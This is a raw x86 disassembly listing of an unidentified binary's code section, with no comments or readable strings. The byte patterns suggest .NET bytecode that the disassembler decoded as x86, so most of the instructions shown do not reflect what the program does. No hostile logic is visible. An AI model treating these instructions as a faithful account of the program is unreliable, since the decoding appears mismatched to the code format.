  402ba5:	11 00                	adc    %eax,(%eax)
  402ba7:	00 06                	add    %al,(%esi)
  402ba9:	28 08                	sub    %cl,(%eax)
  402bab:	00 00                	add    %al,(%eax)
  402bad:	06                   	push   %es
  402bae:	28 0a                	sub    %cl,(%edx)
  402bb0:	00 00                	add    %al,(%eax)
  402bb2:	06                   	push   %es
  402bb3:	28 0e                	sub    %cl,(%esi)
  402bb5:	00 00                	add    %al,(%eax)
  402bb7:	06                   	push   %es
  402bb8:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402bbe:	69 14 fe 06 1d 00 00 	imul   $0x1d06,(%esi,%edi,8),%edx
  402bc5:	06                   	push   %es
  402bc6:	73 3c                	jae    0x402c04
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402bcd:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402bd2:	2b 06                	sub    (%esi),%eax
  402bd4:	16                   	push   %ss
  402bd5:	28 13                	sub    %dl,(%ebx)
  402bd7:	00 00                	add    %al,(%eax)
  402bd9:	06                   	push   %es
  402bda:	de 09                	fimuls (%ecx)
  402bdc:	26 16                	es push %ss
  402bde:	28 13                	sub    %dl,(%ebx)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	06                   	push   %es
  402be3:	de 00                	fiadds (%eax)
  402be5:	2a 00                	sub    (%eax),%al
  402be7:	00 41 4c             	add    %al,0x4c(%ecx)
  402bea:	00 00                	add    %al,(%eax)
  402bec:	00 00                	add    %al,(%eax)
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	c4 00                	les    (%eax),%eax
  402bf2:	00 00                	add    %al,(%eax)
  402bf4:	20 00                	and    %al,(%eax)
  402bf6:	00 00                	add    %al,(%eax)
  402bf8:	e4 00                	in     $0x0,%al
  402bfa:	00 00                	add    %al,(%eax)
  402bfc:	03 00                	add    (%eax),%eax
  402bfe:	00 00                	add    %al,(%eax)
  402c00:	01 00                	add    %eax,(%eax)
  402c02:	00 01                	add    %al,(%ecx)
  402c04:	02 00                	add    (%eax),%al
  402c06:	00 00                	add    %al,(%eax)
  402c08:	0e                   	push   %cs
  402c09:	01 00                	add    %eax,(%eax)
  402c0b:	00 77 00             	add    %dh,0x0(%edi)
  402c0e:	00 00                	add    %al,(%eax)
  402c10:	85 01                	test   %eax,(%ecx)
  402c12:	00 00                	add    %al,(%eax)
  402c14:	0c 00                	or     $0x0,%al
	...
  402c22:	00 00                	add    %al,(%eax)
  402c24:	94                   	xchg   %eax,%esp
  402c25:	02 00                	add    (%eax),%al
  402c27:	00 94 02 00 00 09 00 	add    %dl,0x90000(%edx,%eax,1)
  402c2e:	00 00                	add    %al,(%eax)
  402c30:	01 00                	add    %eax,(%eax)
  402c32:	00 01                	add    %al,(%ecx)
  402c34:	1b 30                	sbb    (%eax),%esi
  402c36:	02 00                	add    (%eax),%al
  402c38:	46                   	inc    %esi
  402c39:	00 00                	add    %al,(%eax)
  402c3b:	00 00                	add    %al,(%eax)
  402c3d:	00 00                	add    %al,(%eax)
  402c3f:	00 28                	add    %ch,(%eax)
  402c41:	15 00 00 06 25       	adc    $0x25060000,%eax
  402c46:	2d 03 26 2b 05       	sub    $0x52b2603,%eax
  402c4b:	28 40 00             	sub    %al,0x0(%eax)
  402c4e:	00 0a                	add    %cl,(%edx)
  402c50:	28 10                	sub    %dl,(%eax)
  402c52:	00 00                	add    %al,(%eax)
  402c54:	06                   	push   %es
  402c55:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402c5a:	05 28 40 00 00       	add    $0x4028,%eax
  402c5f:	0a 28                	or     (%eax),%ch
  402c61:	08 00                	or     %al,(%eax)
  402c63:	00 06                	add    %al,(%esi)
  402c65:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402c6a:	05 28 41 00 00       	add    $0x4128,%eax
  402c6f:	0a 28                	or     (%eax),%ch
  402c71:	06                   	push   %es
  402c72:	00 00                	add    %al,(%eax)
  402c74:	06                   	push   %es
  402c75:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402c7a:	05 28 42 00 00       	add    $0x4228,%eax
  402c7f:	0a de                	or     %dh,%bl
  402c81:	03 26                	add    (%esi),%esp
  402c83:	de 00                	fiadds (%eax)
  402c85:	2a 00                	sub    (%eax),%al
  402c87:	00 01                	add    %al,(%ecx)
  402c89:	10 00                	adc    %al,(%eax)
  402c8b:	00 00                	add    %al,(%eax)
  402c8d:	00 00                	add    %al,(%eax)
  402c8f:	00 42 42             	add    %al,0x42(%edx)
  402c92:	00 03                	add    %al,(%ebx)
  402c94:	01 00                	add    %eax,(%eax)
  402c96:	00 01                	add    %al,(%ecx)
  402c98:	1b 30                	sbb    (%eax),%esi
  402c9a:	06                   	push   %es
  402c9b:	00 96 01 00 00 04    	add    %dl,0x4000001(%esi)
  402ca1:	00 00                	add    %al,(%eax)
  402ca3:	11 28                	adc    %ebp,(%eax)
  402ca5:	06                   	push   %es
  402ca6:	00 00                	add    %al,(%eax)
  402ca8:	06                   	push   %es
  402ca9:	6f                   	outsl  %ds:(%esi),(%dx)
  402caa:	2c 00                	sub    $0x0,%al
  402cac:	00 0a                	add    %cl,(%edx)
  402cae:	2c 07                	sub    $0x7,%al
  402cb0:	28 12                	sub    %dl,(%edx)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	06                   	push   %es
  402cb5:	2d 0b 16 28 13       	sub    $0x1328160b,%eax
  402cba:	00 00                	add    %al,(%eax)
  402cbc:	06                   	push   %es
  402cbd:	dd 77 01             	fnsave 0x1(%edi)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	28 08                	sub    %cl,(%eax)
  402cc4:	00 00                	add    %al,(%eax)
  402cc6:	06                   	push   %es
  402cc7:	02 6f 43             	add    0x43(%edi),%ch
  402cca:	00 00                	add    %al,(%eax)
  402ccc:	0a 0a                	or     (%edx),%cl
  402cce:	06                   	push   %es
  402ccf:	16                   	push   %ss
  402cd0:	3e 53                	ds push %ebx
  402cd2:	01 00                	add    %eax,(%eax)
  402cd4:	00 28                	add    %ch,(%eax)
  402cd6:	0e                   	push   %cs
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	06                   	push   %es
  402cda:	06                   	push   %es
  402cdb:	6a 58                	push   $0x58
  402cdd:	28 0f                	sub    %cl,(%edi)
  402cdf:	00 00                	add    %al,(%eax)
  402ce1:	06                   	push   %es
  402ce2:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402ce5:	00 06                	add    %al,(%esi)
  402ce7:	06                   	push   %es
  402ce8:	6a 59                	push   $0x59
  402cea:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402cf0:	0c 00                	or     $0x0,%al
  402cf2:	00 06                	add    %al,(%esi)
  402cf4:	3a f3                	cmp    %bl,%dh
  402cf6:	00 00                	add    %al,(%eax)
  402cf8:	00 28                	add    %ch,(%eax)
  402cfa:	0a 00                	or     (%eax),%al
  402cfc:	00 06                	add    %al,(%esi)
  402cfe:	16                   	push   %ss
  402cff:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402d03:	0a 6a 28             	or     0x28(%edx),%ch
  402d06:	0d 00 00 06 28       	or     $0x28060000,%eax
  402d0b:	0c 00                	or     $0x0,%al
  402d0d:	00 06                	add    %al,(%esi)
  402d0f:	16                   	push   %ss
  402d10:	6a 3e                	push   $0x3e
  402d12:	b6 00                	mov    $0x0,%dh
  402d14:	00 00                	add    %al,(%eax)
  402d16:	16                   	push   %ss
  402d17:	6a 28                	push   $0x28
  402d19:	0f 00 00             	sldt   (%eax)
  402d1c:	06                   	push   %es
  402d1d:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d20:	00 06                	add    %al,(%esi)
  402d22:	d4 8d                	aam    $0x8d
  402d24:	44                   	inc    %esp
  402d25:	00 00                	add    %al,(%eax)
  402d27:	01 28                	add    %ebp,(%eax)
  402d29:	0b 00                	or     (%eax),%eax
  402d2b:	00 06                	add    %al,(%esi)
  402d2d:	2b 59 28             	sub    0x28(%ecx),%ebx
  402d30:	08 00                	or     %al,(%eax)
  402d32:	00 06                	add    %al,(%esi)
  402d34:	28 0a                	sub    %cl,(%edx)
  402d36:	00 00                	add    %al,(%eax)
  402d38:	06                   	push   %es
  402d39:	28 0e                	sub    %cl,(%esi)
  402d3b:	00 00                	add    %al,(%eax)
  402d3d:	06                   	push   %es
  402d3e:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402d44:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402d4b:	07                   	pop    %es
  402d4c:	16                   	push   %ss
  402d4d:	30 0b                	xor    %cl,(%ebx)
  402d4f:	16                   	push   %ss
  402d50:	28 13                	sub    %dl,(%ebx)
  402d52:	00 00                	add    %al,(%eax)
  402d54:	06                   	push   %es
  402d55:	dd df                	fstp   %st(7)
  402d57:	00 00                	add    %al,(%eax)
  402d59:	00 28                	add    %ch,(%eax)
  402d5b:	0e                   	push   %cs
  402d5c:	00 00                	add    %al,(%eax)
  402d5e:	06                   	push   %es
  402d5f:	07                   	pop    %es
  402d60:	6a 58                	push   $0x58
  402d62:	28 0f                	sub    %cl,(%edi)
  402d64:	00 00                	add    %al,(%eax)
  402d66:	06                   	push   %es
  402d67:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d6a:	00 06                	add    %al,(%esi)
  402d6c:	07                   	pop    %es
  402d6d:	6a 59                	push   $0x59
  402d6f:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d75:	0c 00                	or     $0x0,%al
  402d77:	00 06                	add    %al,(%esi)
  402d79:	16                   	push   %ss
  402d7a:	6a 2f                	push   $0x2f
  402d7c:	0b 16                	or     (%esi),%edx
  402d7e:	28 13                	sub    %dl,(%ebx)
  402d80:	00 00                	add    %al,(%eax)
  402d82:	06                   	push   %es
  402d83:	dd b1 00 00 00 28    	fnsave 0x28000000(%ecx)
  402d89:	0c 00                	or     $0x0,%al
  402d8b:	00 06                	add    %al,(%esi)
  402d8d:	16                   	push   %ss
  402d8e:	6a 30                	push   $0x30
  402d90:	9e                   	sahf
  402d91:	14 fe                	adc    $0xfe,%al
  402d93:	06                   	push   %es
  402d94:	92                   	xchg   %eax,%edx
  402d95:	00 00                	add    %al,(%eax)
  402d97:	06                   	push   %es
  402d98:	73 46                	jae    0x402de0
  402d9a:	00 00                	add    %al,(%eax)
  402d9c:	0a 73 47             	or     0x47(%ebx),%dh
  402d9f:	00 00                	add    %al,(%eax)
  402da1:	0a 28                	or     (%eax),%ch
  402da3:	0a 00                	or     (%eax),%al
  402da5:	00 06                	add    %al,(%esi)
  402da7:	6f                   	outsl  %ds:(%esi),(%dx)
  402da8:	48                   	dec    %eax
  402da9:	00 00                	add    %al,(%eax)
  402dab:	0a 16                	or     (%esi),%dl
  402dad:	6a 28                	push   $0x28
  402daf:	0f 00 00             	sldt   (%eax)
  402db2:	06                   	push   %es
  402db3:	1a 6a 28             	sbb    0x28(%edx),%ch
  402db6:	0d 00 00 06 28       	or     $0x28060000,%eax
  402dbb:	0c 00                	or     $0x0,%al
  402dbd:	00 06                	add    %al,(%esi)
  402dbf:	d4 8d                	aam    $0x8d
  402dc1:	44                   	inc    %esp
  402dc2:	00 00                	add    %al,(%eax)
  402dc4:	01 28                	add    %ebp,(%eax)
  402dc6:	0b 00                	or     (%eax),%eax
  402dc8:	00 06                	add    %al,(%esi)
  402dca:	2b 31                	sub    (%ecx),%esi
  402dcc:	1a 6a 28             	sbb    0x28(%edx),%ch
  402dcf:	0d 00 00 06 28       	or     $0x28060000,%eax
  402dd4:	0c 00                	or     $0x0,%al
  402dd6:	00 06                	add    %al,(%esi)
  402dd8:	d4 8d                	aam    $0x8d
  402dda:	44                   	inc    %esp
  402ddb:	00 00                	add    %al,(%eax)
  402ddd:	01 28                	add    %ebp,(%eax)
  402ddf:	0b 00                	or     (%eax),%eax
  402de1:	00 06                	add    %al,(%esi)
  402de3:	16                   	push   %ss
  402de4:	6a 28                	push   $0x28
  402de6:	0f 00 00             	sldt   (%eax)
  402de9:	06                   	push   %es
  402dea:	2b 11                	sub    (%ecx),%edx
  402dec:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402def:	00 06                	add    %al,(%esi)
  402df1:	16                   	push   %ss
  402df2:	6a 2f                	push   $0x2f
  402df4:	08 16                	or     %dl,(%esi)
  402df6:	28 13                	sub    %dl,(%ebx)
  402df8:	00 00                	add    %al,(%eax)
  402dfa:	06                   	push   %es
  402dfb:	de 3c 28             	fidivrs (%eax,%ebp,1)
  402dfe:	08 00                	or     %al,(%eax)
  402e00:	00 06                	add    %al,(%esi)
  402e02:	28 0a                	sub    %cl,(%edx)
  402e04:	00 00                	add    %al,(%eax)
  402e06:	06                   	push   %es
  402e07:	28 0e                	sub    %cl,(%esi)
  402e09:	00 00                	add    %al,(%eax)
  402e0b:	06                   	push   %es
  402e0c:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402e12:	69 14 fe 06 1d 00 00 	imul   $0x1d06,(%esi,%edi,8),%edx
  402e19:	06                   	push   %es
  402e1a:	73 3c                	jae    0x402e58
  402e1c:	00 00                	add    %al,(%eax)
  402e1e:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402e21:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402e26:	2b 06                	sub    (%esi),%eax
  402e28:	16                   	push   %ss
  402e29:	28 13                	sub    %dl,(%ebx)
  402e2b:	00 00                	add    %al,(%eax)
  402e2d:	06                   	push   %es
  402e2e:	de 09                	fimuls (%ecx)
  402e30:	26 16                	es push %ss
  402e32:	28 13                	sub    %dl,(%ebx)
  402e34:	00 00                	add    %al,(%eax)
  402e36:	06                   	push   %es
  402e37:	de 00                	fiadds (%eax)
  402e39:	2a 00                	sub    (%eax),%al
  402e3b:	00 41 1c             	add    %al,0x1c(%ecx)
	...
  402e46:	00 00                	add    %al,(%eax)
  402e48:	8c 01                	mov    %es,(%ecx)
  402e4a:	00 00                	add    %al,(%eax)
  402e4c:	8c 01                	mov    %es,(%ecx)
  402e4e:	00 00                	add    %al,(%eax)
  402e50:	09 00                	or     %eax,(%eax)
  402e52:	00 00                	add    %al,(%eax)
  402e54:	01 00                	add    %eax,(%eax)
  402e56:	00 01                	add    %al,(%ecx)
  402e58:	1b 30                	sbb    (%eax),%esi
  402e5a:	04 00                	add    $0x0,%al
  402e5c:	e5 00                	in     $0x0,%eax
  402e5e:	00 00                	add    %al,(%eax)
  402e60:	05 00 00 11 28       	add    $0x28110000,%eax
  402e65:	14 00                	adc    $0x0,%al
  402e67:	00 06                	add    %al,(%esi)
  402e69:	0a 16                	or     (%esi),%dl
  402e6b:	0b 06                	or     (%esi),%eax
  402e6d:	12 01                	adc    (%ecx),%al
  402e6f:	28 49 00             	sub    %cl,0x0(%ecx)
  402e72:	00 0a                	add    %cl,(%edx)
  402e74:	28 12                	sub    %dl,(%edx)
  402e76:	00 00                	add    %al,(%eax)
  402e78:	06                   	push   %es
  402e79:	2c 03                	sub    $0x3,%al
  402e7b:	02 2d 05 dd c5 00    	add    0xc5dd05,%ch
  402e81:	00 00                	add    %al,(%eax)
  402e83:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402e89:	00 0a                	add    %cl,(%edx)
  402e8b:	0c 28                	or     $0x28,%al
  402e8d:	06                   	push   %es
  402e8e:	00 00                	add    %al,(%eax)
  402e90:	06                   	push   %es
  402e91:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402e96:	00 0a                	add    %cl,(%edx)
  402e98:	26 28 08             	sub    %cl,%es:(%eax)
  402e9b:	00 00                	add    %al,(%eax)
  402e9d:	06                   	push   %es
  402e9e:	08 16                	or     %dl,(%esi)
  402ea0:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402ea6:	00 0a                	add    %cl,(%edx)
  402ea8:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402eae:	0f 00                	(bad)
  402eb0:	31 5b 02             	xor    %ebx,0x2(%ebx)
  402eb3:	73 4d                	jae    0x402f02
  402eb5:	00 00                	add    %al,(%eax)
  402eb7:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402ebd:	16                   	push   %ss
  402ebe:	6a 6f                	push   $0x6f
  402ec0:	4e                   	dec    %esi
  402ec1:	00 00                	add    %al,(%eax)
  402ec3:	0a 20                	or     (%eax),%ah
  402ec5:	50                   	push   %eax
  402ec6:	c3                   	ret
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402ecd:	01 13                	add    %edx,(%ebx)
  402ecf:	05 2b 1c 28 06       	add    $0x6281c2b,%eax
  402ed4:	00 00                	add    %al,(%eax)
  402ed6:	06                   	push   %es
  402ed7:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402edc:	00 0a                	add    %cl,(%edx)
  402ede:	26 28 08             	sub    %cl,%es:(%eax)
  402ee1:	00 00                	add    %al,(%eax)
  402ee3:	06                   	push   %es
  402ee4:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402eea:	4c                   	dec    %esp
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	0a 09                	or     (%ecx),%cl
  402eef:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402ef5:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402efc:	13 04 16             	adc    (%esi,%edx,1),%eax
  402eff:	30 d1                	xor    %dl,%cl
  402f01:	de 30                	fidivs (%eax)
  402f03:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  402f06:	09 6f 33             	or     %ebp,0x33(%edi)
  402f09:	00 00                	add    %al,(%eax)
  402f0b:	0a dc                	or     %ah,%bl
  402f0d:	28 06                	sub    %al,(%esi)
  402f0f:	00 00                	add    %al,(%eax)
  402f11:	06                   	push   %es
  402f12:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f17:	00 0a                	add    %cl,(%edx)
  402f19:	26 28 08             	sub    %cl,%es:(%eax)
  402f1c:	00 00                	add    %al,(%eax)
  402f1e:	06                   	push   %es
  402f1f:	02 16                	add    (%esi),%dl
  402f21:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  402f27:	00 0a                	add    %cl,(%edx)
  402f29:	28 08                	sub    %cl,(%eax)
  402f2b:	00 00                	add    %al,(%eax)
  402f2d:	06                   	push   %es
  402f2e:	6f                   	outsl  %ds:(%esi),(%dx)
  402f2f:	4f                   	dec    %edi
  402f30:	00 00                	add    %al,(%eax)
  402f32:	0a de                	or     %dh,%bl
  402f34:	13 26                	adc    (%esi),%esp
  402f36:	16                   	push   %ss
  402f37:	28 13                	sub    %dl,(%ebx)
  402f39:	00 00                	add    %al,(%eax)
  402f3b:	06                   	push   %es
  402f3c:	de 0a                	fimuls (%edx)
  402f3e:	07                   	pop    %es
  402f3f:	2c 06                	sub    $0x6,%al
  402f41:	06                   	push   %es
  402f42:	28 50 00             	sub    %dl,0x0(%eax)
  402f45:	00 0a                	add    %cl,(%edx)
  402f47:	dc 2a                	fsubrl (%edx)
  402f49:	00 00                	add    %al,(%eax)
  402f4b:	00 01                	add    %al,(%ecx)
  402f4d:	28 00                	sub    %al,(%eax)
  402f4f:	00 02                	add    %al,(%edx)
  402f51:	00 55 00             	add    %dl,0x0(%ebp)
  402f54:	4a                   	dec    %edx
  402f55:	9f                   	lahf
  402f56:	00 0a                	add    %cl,(%edx)
  402f58:	00 00                	add    %al,(%eax)
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	00 00                	add    %al,(%eax)
  402f5e:	10 00                	adc    %al,(%eax)
  402f60:	c1 d1 00             	rcl    $0x0,%ecx
  402f63:	09 01                	or     %eax,(%ecx)
  402f65:	00 00                	add    %al,(%eax)
  402f67:	01 02                	add    %eax,(%edx)
  402f69:	00 08                	add    %cl,(%eax)
  402f6b:	00 d2                	add    %dl,%dl
  402f6d:	da 00                	fiaddl (%eax)
  402f6f:	0a 00                	or     (%eax),%al
  402f71:	00 00                	add    %al,(%eax)
  402f73:	00 13                	add    %dl,(%ebx)
  402f75:	30 05 00 86 00 00    	xor    %al,0x8600
  402f7b:	00 00                	add    %al,(%eax)
  402f7d:	00 00                	add    %al,(%eax)
  402f7f:	00 73 62             	add    %dh,0x62(%ebx)
  402f82:	00 00                	add    %al,(%eax)
  402f84:	06                   	push   %es
  402f85:	25 72 75 20 00       	and    $0x207572,%eax
  402f8a:	70 6f                	jo     0x402ffb
  402f8c:	4d                   	dec    %ebp
  402f8d:	00 00                	add    %al,(%eax)
  402f8f:	06                   	push   %es
  402f90:	72 83                	jb     0x402f15
  402f92:	20 00                	and    %al,(%eax)
  402f94:	70 6f                	jo     0x403005
  402f96:	5a                   	pop    %edx
  402f97:	00 00                	add    %al,(%eax)
  402f99:	06                   	push   %es
  402f9a:	25 72 8d 20 00       	and    $0x208d72,%eax
  402f9f:	70 6f                	jo     0x403010
  402fa1:	4d                   	dec    %ebp
  402fa2:	00 00                	add    %al,(%eax)
  402fa4:	06                   	push   %es
  402fa5:	72 9d                	jb     0x402f44
  402fa7:	20 00                	and    %al,(%eax)
  402fa9:	70 7e                	jo     0x403029
  402fab:	10 00                	adc    %al,(%eax)
  402fad:	00 04 28             	add    %al,(%eax,%ebp,1)
  402fb0:	8e 00                	mov    (%eax),%es
  402fb2:	00 06                	add    %al,(%esi)
  402fb4:	25 2d 06 26 72       	and    $0x7226062d,%eax
  402fb9:	ab                   	stos   %eax,%es:(%edi)
  402fba:	20 00                	and    %al,(%eax)
  402fbc:	70 28                	jo     0x402fe6
  402fbe:	51                   	push   %ecx
  402fbf:	00 00                	add    %al,(%eax)
  402fc1:	0a 6f 5a             	or     0x5a(%edi),%ch
  402fc4:	00 00                	add    %al,(%eax)
  402fc6:	06                   	push   %es
  402fc7:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc8:	57                   	push   %edi
  402fc9:	00 00                	add    %al,(%eax)
  402fcb:	06                   	push   %es
  402fcc:	28 1e                	sub    %bl,(%esi)
  402fce:	00 00                	add    %al,(%eax)
  402fd0:	06                   	push   %es
  402fd1:	28 15 00 00 06 25    	sub    %dl,0x25060000
  402fd7:	2d 03 26 2b 05       	sub    $0x52b2603,%eax
  402fdc:	28 40 00             	sub    %al,0x0(%eax)
  402fdf:	00 0a                	add    %cl,(%edx)
  402fe1:	16                   	push   %ss
  402fe2:	28 18                	sub    %bl,(%eax)
  402fe4:	00 00                	add    %al,(%eax)
  402fe6:	06                   	push   %es
  402fe7:	14 fe                	adc    $0xfe,%al
  402fe9:	06                   	push   %es
  402fea:	20 00                	and    %al,(%eax)
  402fec:	00 06                	add    %al,(%esi)
  402fee:	73 3a                	jae    0x40302a
  402ff0:	00 00                	add    %al,(%eax)
  402ff2:	0a 14 17             	or     (%edi,%edx,1),%dl
  402ff5:	17                   	pop    %ss
  402ff6:	73 3b                	jae    0x403033
  402ff8:	00 00                	add    %al,(%eax)
  402ffa:	0a 28                	or     (%eax),%ch
  402ffc:	16                   	push   %ss
  402ffd:	00 00                	add    %al,(%eax)
  402fff:	06                   	push   %es
  403000:	28 52 00             	sub    %dl,0x0(%edx)
  403003:	00 0a                	add    %cl,(%edx)
  403005:	2a 00                	sub    (%eax),%al
  403007:	00 13                	add    %dl,(%ebx)
  403009:	30 03                	xor    %al,(%ebx)
  40300b:	00 38                	add    %bh,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	00 06                	add    %al,(%esi)
  403011:	00 00                	add    %al,(%eax)
  403013:	11 73 53             	adc    %esi,0x53(%ebx)
  403016:	00 00                	add    %al,(%eax)
  403018:	0a 0a                	or     (%edx),%cl
  40301a:	02 0b                	add    (%ebx),%cl
  40301c:	16                   	push   %ss
  40301d:	0c 2b                	or     $0x2b,%al
  40301f:	1f                   	pop    %ds
  403020:	07                   	pop    %es
  403021:	08 91 0d 06 72 af    	or     %dl,-0x508df9f3(%ecx)
  403027:	20 00                	and    %al,(%eax)
  403029:	70 09                	jo     0x403034
  40302b:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  40302f:	01 28                	add    %ebp,(%eax)
  403031:	54                   	push   %esp
  403032:	00 00                	add    %al,(%eax)
  403034:	0a 6f 55             	or     0x55(%edi),%ch
  403037:	00 00                	add    %al,(%eax)
  403039:	0a 26                	or     (%esi),%ah
  40303b:	08 17                	or     %dl,(%edi)
  40303d:	58                   	pop    %eax
  40303e:	0c 08                	or     $0x8,%al
  403040:	07                   	pop    %es
  403041:	8e 69 32             	mov    0x32(%ecx),%gs
  403044:	db 06                	fildl  (%esi)
  403046:	6f                   	outsl  %ds:(%esi),(%dx)
  403047:	38 00                	cmp    %al,(%eax)
  403049:	00 0a                	add    %cl,(%edx)
  40304b:	2a 13                	sub    (%ebx),%dl
  40304d:	30 03                	xor    %al,(%ebx)
  40304f:	00 38                	add    %bh,(%eax)
  403051:	00 00                	add    %al,(%eax)
  403053:	00 06                	add    %al,(%esi)
  403055:	00 00                	add    %al,(%eax)
  403057:	11 73 53             	adc    %esi,0x53(%ebx)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	0a 0a                	or     (%edx),%cl
  40305e:	02 0b                	add    (%ebx),%cl
  403060:	16                   	push   %ss
  403061:	0c 2b                	or     $0x2b,%al
  403063:	1f                   	pop    %ds
  403064:	07                   	pop    %es
  403065:	08 91 0d 06 72 bf    	or     %dl,-0x408df9f3(%ecx)
  40306b:	20 00                	and    %al,(%eax)
  40306d:	70 09                	jo     0x403078
  40306f:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  403073:	01 28                	add    %ebp,(%eax)
  403075:	54                   	push   %esp
  403076:	00 00                	add    %al,(%eax)
  403078:	0a 6f 55             	or     0x55(%edi),%ch
  40307b:	00 00                	add    %al,(%eax)
  40307d:	0a 26                	or     (%esi),%ah
  40307f:	08 17                	or     %dl,(%edi)
  403081:	58                   	pop    %eax
  403082:	0c 08                	or     $0x8,%al
  403084:	07                   	pop    %es
  403085:	8e 69 32             	mov    0x32(%ecx),%gs
  403088:	db 06                	fildl  (%esi)
  40308a:	6f                   	outsl  %ds:(%esi),(%dx)
  40308b:	38 00                	cmp    %al,(%eax)
  40308d:	00 0a                	add    %cl,(%edx)
  40308f:	2a 13                	sub    (%ebx),%dl
  403091:	30 04 00             	xor    %al,(%eax,%eax,1)
  403094:	29 00                	sub    %eax,(%eax)
  403096:	00 00                	add    %al,(%eax)
  403098:	07                   	pop    %es
  403099:	00 00                	add    %al,(%eax)
  40309b:	11 02                	adc    %eax,(%edx)
  40309d:	8e 69 8d             	mov    -0x73(%ecx),%gs
  4030a0:	44                   	inc    %esp
  4030a1:	00 00                	add    %al,(%eax)
  4030a3:	01 0a                	add    %ecx,(%edx)
  4030a5:	02 8e 69 17 59 0b    	add    0xb591769(%esi),%cl
  4030ab:	16                   	push   %ss
  4030ac:	0c 2b                	or     $0x2b,%al
  4030ae:	0e                   	push   %cs
  4030af:	06                   	push   %es
  4030b0:	08 02                	or     %al,(%edx)
  4030b2:	07                   	pop    %es
  4030b3:	91                   	xchg   %eax,%ecx
  4030b4:	9c                   	pushf
  4030b5:	07                   	pop    %es
  4030b6:	17                   	pop    %ss
  4030b7:	59                   	pop    %ecx
  4030b8:	0b 08                	or     (%eax),%ecx
  4030ba:	17                   	pop    %ss
  4030bb:	58                   	pop    %eax
  4030bc:	0c 08                	or     $0x8,%al
  4030be:	06                   	push   %es
  4030bf:	8e 69 32             	mov    0x32(%ecx),%gs
  4030c2:	ec                   	in     (%dx),%al
  4030c3:	06                   	push   %es
  4030c4:	2a 00                	sub    (%eax),%al
  4030c6:	00 00                	add    %al,(%eax)
  4030c8:	13 30                	adc    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	33 00                	xor    (%eax),%eax
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	01 00                	add    %eax,(%eax)
  4030d2:	00 11                	add    %dl,(%ecx)
  4030d4:	16                   	push   %ss
  4030d5:	0a 2b                	or     (%ebx),%ch
  4030d7:	15 02 7b 26 00       	adc    $0x267b02,%eax
  4030dc:	00 04 06             	add    %al,(%esi,%eax,1)
  4030df:	6f                   	outsl  %ds:(%esi),(%dx)
  4030e0:	59                   	pop    %ecx
  4030e1:	00 00                	add    %al,(%eax)
  4030e3:	0a 6f 39             	or     0x39(%edi),%ch
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	06                   	push   %es
  4030e9:	06                   	push   %es
  4030ea:	17                   	pop    %ss
  4030eb:	58                   	pop    %eax
  4030ec:	0a 06                	or     (%esi),%al
  4030ee:	02 7b 26             	add    0x26(%ebx),%bh
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	04 6f                	add    $0x6f,%al
  4030f5:	5a                   	pop    %edx
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	0a 32                	or     (%edx),%dh
  4030fa:	dd 02                	fldl   (%edx)
  4030fc:	7b 26                	jnp    0x403124
  4030fe:	00 00                	add    %al,(%eax)
  403100:	04 6f                	add    $0x6f,%al
  403102:	5c                   	pop    %esp
  403103:	00 00                	add    %al,(%eax)
  403105:	0a 2a                	or     (%edx),%ch
  403107:	00 13                	add    %dl,(%ebx)
  403109:	30 02                	xor    %al,(%edx)
  40310b:	00 1b                	add    %bl,(%ebx)
  40310d:	00 00                	add    %al,(%eax)
  40310f:	00 08                	add    %cl,(%eax)
  403111:	00 00                	add    %al,(%eax)
  403113:	11 73 62             	adc    %esi,0x62(%ebx)
  403116:	00 00                	add    %al,(%eax)
  403118:	06                   	push   %es
  403119:	0a 06                	or     (%esi),%al
